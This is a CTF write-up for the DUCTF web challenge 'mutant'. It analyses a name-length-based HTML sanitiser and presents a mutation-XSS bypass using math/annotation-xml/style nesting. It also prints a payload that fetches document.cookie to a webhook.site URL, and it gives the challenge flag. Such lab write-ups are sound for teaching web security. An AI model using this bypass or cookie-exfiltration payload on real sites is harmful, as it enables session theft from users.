# 🏷️ mutant

**Category:** Web  
**Description:**  
> Just an XSS. What more is there to it?

----
<img src='https://github.com/Yazan03/CTF-writeups2025/blob/main/DU%20CTF/mutant/images/1.PNG?raw=true'>

<br></br>

**index.js**
```js
const inp = new URLSearchParams(location.search).get("input");

// Reporting stuff
reportbtn.addEventListener('click', () => {
  fetch("/report", {
    method: "POST",
    body: inp
  }).then(r => alert("Successfully reported")).catch(alert);
});

// Challenge
mytextarea.value = inp;

console.log("Original", inp);

const t = document.createElement("template");
t.innerHTML = inp;

console.log("After injecting into template", t.innerHTML);

const nodes = [t.content];
while (nodes.length > 0) {
  const n = nodes.pop();

  console.log("Parsed element", n.outerHTML);

  if (n.attributes) {
    while (n.attributes.length > 0) {
      n.removeAttribute(n.attributes[0].name);
    }
  }

  // Fix XSS reported by our bug bounty community
  if (n.nodeName !== "#document-fragment" && (n.nodeName.length === 6 || n.nodeName.length === 8)) {
    n.parentNode.removeChild(n);
    continue;
  }
  
  for (let i = n.children.length - 1; i >= 0; i--) {
    nodes.push(n.children[i]);
  }
}

console.log("After sanitization", t.innerHTML);

myoutputdebug.innerText = t.innerHTML;
myoutput.innerHTML = t.innerHTML;

console.log("Final", myoutput.innerHTML);
```

This is the sanitization process : 


```js
const nodes = [t.content];
while (nodes.length > 0) {
  const n = nodes.pop();
  console.log("Parsed element", n.outerHTML);

  if (n.attributes) {
    while (n.attributes.length > 0) {
      n.removeAttribute(n.attributes[0].name);
    }
  }

  // Fix XSS reported by our bug bounty community
  if (n.nodeName !== "#document-fragment" && (n.nodeName.length === 6 || n.nodeName.length === 8)) {
    n.parentNode.removeChild(n);
    continue;
  }
  
  for (let i = n.children.length - 1; i >= 0; i--) {
    nodes.push(n.children[i]);
  }
}
```


Iterates through the fragment’s nodes recursively.

Removes all attributes from each element.

Then tries to remove some elements based on nodeName.length:
```js
if (n.nodeName !== "#document-fragment" && (n.nodeName.length === 6 || n.nodeName.length === 8))
```

As we can see, the length is not a problem because there are some payloads we can use, such as `<svg>`, `<img>`, etc.

Testing some stuff didn’t work, then I tried some mutation XSS like `<table><h1>hello</h1></table>`

and the result was `<h1>hello</h1><table></table>`
<br />
<img src='https://github.com/Yazan03/CTF-writeups2025/blob/main/DU%20CTF/mutant/images/2.PNG?raw=true'>
<br />
Then I tried to construct a valid payload and got a working one:
<br />
<br />

```
<math><annotation-xml encoding="text/html"><style><img src onerror=alert(origin)>
```
<br />
<img src='https://github.com/Yazan03/CTF-writeups2025/blob/main/DU%20CTF/mutant/images/4.PNG?raw=true'>
<br />

***Let's get the flag***

```
<math><annotation-xml encoding="text/html"><style><img src onerror=fetch('https://webhook.site/62cfc181-7e74-4ff1-9674-039cbc4fc143?x='+document.cookie)>
```

<br />

<img src='https://github.com/Yazan03/CTF-writeups2025/blob/main/DU%20CTF/mutant/images/5.PNG?raw=true'>
<br />

***Report to the admin***

<img src='https://github.com/Yazan03/CTF-writeups2025/blob/main/DU%20CTF/mutant/images/6.PNG?raw=true'>

<br />

FLAG :
```
DUCTF{if_y0u_d1dnt_us3_mutation_x5S_th3n_it_w45_un1nt3nded_435743723}
```
